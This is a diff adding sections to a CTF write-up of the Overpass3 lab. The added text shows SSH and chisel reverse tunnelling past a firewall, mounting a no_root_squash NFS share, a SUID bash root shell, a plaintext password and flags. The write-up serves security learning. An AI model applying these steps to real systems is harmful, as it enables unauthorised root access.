@@ -1,12 +1,15 @@
 ---
 layout: default
 title: Overpass3Hosting
-status: incomplete
 ---
 
 ## TL;DR
 
+In this challenge we find the file `backup.zip` which contains `CustomerDetails.xslx` encrypted plus private key. We decrypt it and find valid credentials for ftp service, we upload webshell and get shell as `apache`
 
+Then we move to `paradox`, and mount to nfs share on `/home/james`, while bypassing the firewall using port tunneling.
+
+Since the nfs is with `no_root_squash`, we can act as root on the share, which gives us the ability to set SUID bits.
 
 ### Recon
 
@@ -44,7 +47,7 @@ Service Info: OS: Unix
 
 I added `overpass3.thm` to my `/etc/hosts`
 
-### ...
+### Find secret backup.zip and credentials inside CustomerDetails.xslx file
 
 when we view the root page, we can see this
 
@@ -264,7 +267,7 @@ bash-4.4$ cat web.flag
 thm{0ae72f7870c3687129f7a824194be09d}
 ```
 
-### ....
+### Mount to nfs share to get /home/james while bypassing firewall by port tunneling
 
 we can change user to `paradox` using the password we already found:
 ```bash
@@ -272,7 +275,151 @@ bash-4.4$ su paradox # ShibesAreGreat123
 Password:  
 [paradox@ip-10-65-144-12 home]$ cd ~
 ```
-### Privilege Escalation to Root
+
+Then, I executed linpeas, we can see these lines:
+```bash
+╔══════════╣ Analyzing NFS Exports Files (limit 70)
+Connected NFS Mounts:                                                                                                                                        
+nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
+sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
+-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+```
+
+![linpeas](image-12.png)
+
+We can verify `nfs` is running by executing `rpcinfo -p`:
+
+![rpcinfo](image-13.png)
+
+Okay, there is `nfs` which is `Network File System`, it's exporting `/home/james`, which the flag `no_root_squash`, which means that if I mount it as `root`, I get root privileges. Notice we have the flag `fsid=0`, `/home/james` plays as root directory on the `NFS`.
+
+I tried to mount it using the command:
+```bash
+sudo mount -t nfs overpass3.thm:/ /tmp/nfs -v
+```
+
+and it failed, it says:
+```bash
+mount.nfs: mount(2): No route to host                                                                       
+```
+
+![no route](image-14.png)
+
+I checked with `nc`, we can see that port `2049` is being filtered, while the port `22` isn't.
+```bash
+┌──(agonen㉿kali)-[~/thm/Overpass3Hosting]                                                                  
+└─$ nc overpass3.thm 2049 -v                                                                                
+overpass3.thm [10.66.150.232] 2049 (nfs) : No route to host                                                 
+                                                                                  
+┌──(agonen㉿kali)-[~/thm/Overpass3Hosting]                                                                  
+└─$ nc overpass3.thm 22 -v
+overpass3.thm [10.66.150.232] 22 (ssh) open
+SSH-2.0-OpenSSH_8.0
+```
+
+Okay, we'll use ssh tunneling to tunnel the port `2049` to our local machine, and then we'll be able to mount.
+
+This is the tunneling, from localhost:2049 to port 2049.
+```bash
+┌──(agonen㉿kali)-[~/thm/Overpass3Hosting]
+└─$ ssh paradox@overpass3.thm -i ./key -L 2049:localhost:2049
+Last login: Tue Dec 23 18:52:21 2025 from 192.168.164.248
+[paradox@ip-10-66-150-232 ~]$
+```
+
+Now, we can mount:
+```bash
+┌──(agonen㉿kali)-[~/thm/Overpass3Hosting]
+└─$ sudo mount -t nfs -o port=2049 localhost:/ /tmp/nfs -v       
+mount.nfs: timeout set for Tue Dec 23 21:12:29 2025
+mount.nfs: trying text-based options 'port=2049,vers=4.2,addr=::1,clientaddr=::1'
+```
+
+![ssh tunnel](image-15.png)
+
+we can grab the user flag:
+```bash
+┌──(agonen㉿kali)-[/tmp/nfs]
+└─$ cat user.flag                
+thm{3693fc86661faa21f16ac9508a43e1ae}
+```
+
+We could have use `chisel` to tunnel the port, this would be on our machine:
+```bash
+chisel server --reverse -p 1234
+```
+
+on the remote machine:
+```bash
+./chisel client 192.168.164.248:1234 R:2049:127.0.0.1:2049
+```
+
+### Privilege Escalation to Root using no_root_squash on nfs share
+
+Now, I pasted my ssh public key inside `.ssh/authorized_keys`, like before, and logged in via ssh to user `james`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Overpass3Hosting]                                                                                                                   
+└─$ ssh james@overpass3.thm -i ./key                                                                                                                         
+Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145                                                                                                    
+[james@ip-10-66-150-232 ~]$
+```
+
+The idea now is to copy the binary `bash` to our home folder, and then on our local machine move to root, and change it to root ownership, plus SUID bit.
+
+So, on the remote machine:
+```bash
+[james@ip-10-66-150-232 ~]$ cp /bin/bash ~/bash
+```
+
+On the local machine, first change to root, and then execute the two commands:
+```bash
+chown root bash
+chmod +s bash
+```
+
+![local machine](image-16.png)
+
+Now, we can go back to the remote machine, and check the file `bash`:
+```bash
+[james@ip-10-66-150-232 ~]$ ls -la bash 
+-rwsr-sr-x 1 root james 1219248 Dec 23 19:18 bash
+```
+
+Okay, we can open root shell:
+```bash
+[james@ip-10-66-150-232 ~]$ ./bash -p
+bash-4.4# id
+uid=1000(james) gid=1000(james) euid=0(root) groups=1000(james)
+```
+
+![root](image-17.png)
+
+and the root flag;
+```bash
+bash-4.4# cat /root/root.flag 
+thm{a4f6adb70371a4bceb32988417456c44}
+```
 
 
+**Bonus**
+
+I checked for the firewall rules, we can see all the services blocked except `dhcp`, `ftp`, `http` and `ssh`. That's why both `ssh tunneling` and `chisel` worked, while direct access to port `2049` didn't work.
+
+```bash
+bash-4.4# firewall-cmd --list-all                                                                                                                            
+public (active)
+  target: default
+  icmp-block-inversion: no
+  interfaces: eth0
+  sources: 
+  services: dhcpv6-client ftp http ssh
+  ports: 
+  protocols: 
+  masquerade: no
+  forward-ports: 
+  source-ports: 
+  icmp-blocks: 
+  rich rules:
+```
 
